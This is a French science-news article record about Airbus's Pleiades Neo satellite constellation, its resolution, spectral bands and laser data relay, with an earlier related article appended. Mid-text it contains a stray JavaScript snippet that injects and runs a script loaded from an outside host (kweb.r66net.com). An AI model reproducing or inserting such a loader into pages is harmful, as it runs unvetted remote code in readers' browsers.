{"title": "Airbus : une constellation inedite de satellites d'observation de la Terre", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-10-20", "content": "En 2020, Airbus lancera les premiers satellites d'une nouvelle constellation, Pleiades Neo. Ils sont censes apporter une amelioration des services et une meilleure reactivite, c'est-a-dire une duree reduite entre deux observations du meme site. Ce qu'il faut retenir Les satellites Pleiades Neo auront des capacites inedites, jusqu'ici reservees aux engins militaires.  Ils seront lances par Vega C a partir de 2020.  Ce seront les premiers satellites optiques commerciaux a utiliser le SpaceDataHighway qui permet des communications laser a tres haut debit (1,8 gigabit/s). En 2016, Airbus a lance le developpement de quatre nouveaux satellites, qui constitueront la  constellation  Pleiades Neo, pour succeder a partir de 2020 aux deux  Pleiades  (1A et 1B) en service depuis 2011 et 2012. Comme pour  Spot 6  et 7, lances en 2012 et 2014,  << ces satellites seront entierement realises sous financement prive, et non sous l'egide du Cnes, comme cela ete le cas pour les  satellites Pleiades  >> , nous explique Francois Lombard, CEO de la division  Intelligence  d'Airbus Defence and Space (regroupant notamment les anciennes activites d'Infoterra et Spot Image). Ils seront lances par paire, par le futur lanceur Vega-C d'Arianespace, dont ce sera le premier contrat commercial. Dans ce marche fortement concurrentiel de l'exploitation des donnees d'observation de la  Terre  basee sur des images a haute et tres haute resolution, et qui tend vers le quasi temps-reel, Airbus Intelligence,  << pour se demarquer >> , mise donc sur  << la qualite des images, la repetitivite et un service offrant une grande flexibilite >> . Chaque satellite balaiera quotidiennement une zone d'un demi-million de kilometres carres, soit environ un superficie comparable a la France metropolitaine, et fournira des images d'une fauchee de 14 kilometres. Pour conserver son avance technologique sur ses concurrents, Airbus n'indique aucune caracteristique de la constellation Pleiades Neo, comme la taille du miroir par exemple. (c) Airbus                               Les Pleiades Neo seront reactifs Pour la resolution geometrique, Pleiades Neo est annonce a 30 centimetres de resolution. Quant a la resolution spectrale, ces nouveaux satellites ajoutent deux bandes a celles des Pleiades 1A et 1B.  << Le  \"deep blue\"  permettra d'observer sous la surface de l'eau, et ainsi surveiller les recifs coralliens, le littoral et les estuaires de fleuves (sediments, phytoplancton), et le  \" red edge \"  servira par exemple a la  gestion de l'agriculture  et le suivi de la vegetation, son stade de developpement et son etat de sante. >>  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Par ailleurs, les Pleiades Neo seront  << tres facilement et rapidement reprogrammables pour repondre aux besoins en images satellite des missions d'urgence >> . Deux satellites supplementaires apportent  << de nouveaux services ou ameliorent ceux existants >> . On pense a l'imagerie toujours a jour :  << Pleiades Neo permettra de couvrir n'importe quelle region de la Terre plus d'une fois par jour >> . Ces images iront directement alimenter la plateforme en ligne d'Airbus,  OneAtlas , qui offre un acces immediat aux images, optiques et radars, acquises par les satellites d'Airbus. \" 30 minutes entre la prise de vue et la fourniture de l'image au client Les quatre satellites Pleiades Neo seront places a 620 kilometres d'altitude, contre 680 kilometres pour Pleiades 1A et 1B. Ils seront couples a une nouvelle generation de segments sol, equipes d'outils informatique d'apprentissage et d'analyses automatiques. Ces futurs satellites sont presentes comme  << tres agiles >> , c'est-a-dire  << capables de s'orienter rapidement et precisement pour viser une region d'interet, en adaptant rapidement le plan de programmation toutes les 1 h 30, soit cinq fois plus souvent qu'aujourd'hui >> . Pour cela, ils seront dotes de terminaux en bande Ka qui  << permettront des mises a jour de derniere minute des plans de programmation, meme si les satellites se trouvent en dehors du champ de visibilite de leur station sol >> . Il s'agit d'un atout important  << notamment pour l'evaluation des  catastrophes naturelles  et les interventions civiles et militaires d'urgence >> . Enfin, chaque satellite sera capable de fournir des images dans des delais tres courts. Le service utilise le systeme spatial de transmission de donnees EDRS, baptise  SpaceDataHighway ,  << avec une capacite de transmission basee sur des communications laser a tres haut debit, de 1,8 Gbps >> . Concretement,  << de l'ordre d'acquisition a la fourniture de l'image a l'utilisateur final, quelque 30 minutes seront necessaires, contre deux heures actuellement >> , indique Hugues Boulnois, responsable SpaceDataHighway chez Airbus Defence and Space. Pour en savoir plus Airbus va se doter d'une constellation inedite de satellites d'observation de la Terre Article de Remy Decourt publie le 03/10/2016 L'observation de la Terre n'est plus l'apanage des scientifiques et des gouvernements. En raison d'enjeux economiques en forte croissance, des entreprises privees se sont installees en  orbite  basse avec leurs satellites. Airbus est un de ces acteurs. Pour garantir la continuite des donnees des satellites Pleiades, il va se doter d'ici cinq ans de sa propre constellation de satellites d'observation de la Terre. A l'occasion de la conference  World Satellite Business Week , organisee du 12 au 16 septembre 2016 par  Euroconsult  a Paris, Airbus Defence and Space a annonce se doter a l'horizon 2020 d'une constellation de satellites d'observation de la Terre a tres haute resolution et tres agiles. Ceux-ci seront lances en 2020 et 2021. L'idee d'Airbus est de garantir la continuite des donnees des  satellites Pleiades , d'ameliorer son offre de service (pour ses marches et  applications  actuels) et d'en proposer de nouvelles utilisant les satellites d' observation de la Terre . Cette constellation sera dotee de quatre satellites construits autour de la plateforme de la famille Astrobus, notamment utilisee pour les  missions Spot 6 et 7 , KazEOSat-1, Ingenio, Sentinel-5 Precursor et  Biomass . Pour realiser ces satellites en un temps tres court (moins de 5 ans), Airbus a fait le choix de miser a la fois sur l'innovation et sur l'amelioration des technologies deja maitrisees. Les performances de cette constellation n'ont pas encore ete communiquees mais elles seront au moins aussi equivalentes a celles des autres acteurs du marche de la tres haute resolution, voire superieures dans certains domaines. Par rapport a Pleiades, elles seront ameliorees pour correspondre a l'evolution attendue du marche de l'observation de la Terre et de l'offre de la concurrence. Les quatre satellites de la future constellation d'Airbus seront construits autour de la meme plateforme utilisee par les satellites Spot 6 et 7 (representes sur cette image). (c) Airbus                               Deux images par jour en tres haute resolution Avec cette constellation, Airbus aura desormais deux images par jour en tres haute resolution, ce qui va permettre plus de reactivite ainsi qu'un meilleur suivi des activites. C'est notamment interessant lors d'une  catastrophe naturelle , comme un  tremblement de terre  par exemple. Les autorites et secours auront alors acces encore plus rapidement a de la ressource image pour cartographier les zones touchees et, grace a la finesse des images, ils pourront mieux qualifier la nature des degats (le degre d' effondrement  des batiments et des routes notamment). Autre exemple, en termes de suivi des activites, les satellites pourront etre a meme de surveiller plus etroitement des activites illegales, dans le domaine de la defense ou encore de la  peche  illicite. Quant au segment sol et a la capacite d'acquisition de plusieurs millions de kilometres carres par jour, Airbus reflechit d'ores et deja a comment valoriser au mieux le  volume  de donnees qui sera disponible. En adaptant les technologies du  big data , du  cloud computing  et de la data analytic a ses besoins, l'entreprise fait le pari d'ameliorer les applications de ses marches traditionnels, mais aussi d'en creer de nouvelles afin de repondre a des besoins specifiques pour des marches en croissance, comme ceux de l'analyse et de l'intelligence. Venus : des images satellite de la Terre sans nuage                       Les satellites permettent d'observer la Terre avec une grande precision. Mais cette possibilite est souvent entravee par la presence de nuages. Le Cnes nous parle au cours de cette video de Venus, un satellite qui permettra d'obtenir des images sans aucune de ces perturbations.                                       ", "theme": "sciences"}